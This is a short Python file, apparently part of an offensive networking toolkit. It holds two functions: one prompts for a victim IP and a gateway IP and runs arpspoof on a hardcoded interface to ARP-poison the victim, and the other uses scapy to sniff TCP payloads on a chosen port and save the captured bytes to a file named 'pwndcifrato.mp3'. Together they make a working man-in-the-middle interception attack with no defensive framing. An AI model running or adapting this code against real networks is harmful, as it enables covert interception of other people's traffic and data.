import socket
socket.has_ipv6=False
from scapy.all import *
from scapy.layers.inet import TCP
from helpers.utils import *
import os

def arpoisoner(out_lck):

    output(out_lck, "Arp Poisoner")

    victimIP = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")

    gatewayIP = loop_input(out_lck, "Please insert Gateway IP or destination IP: ")

    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % ("enx9cebe811a79a", "192.168." + victimIP, gatewayIP))


def analyzer(out_lck, port):

    file = open("sniffed/pwndcifrato.mp3", "wb")

    output(out_lck, "Analizer")

    time = loop_int_input(out_lck, "Please insert a timeout for the sniffer (in second): ")

    array = []
    sniff(filter="port %s" % port, timeout=time, prn=lambda x: array.append(bytes(x[TCP].payload)))

    for el in array:
        file.write(el)
    file.close()



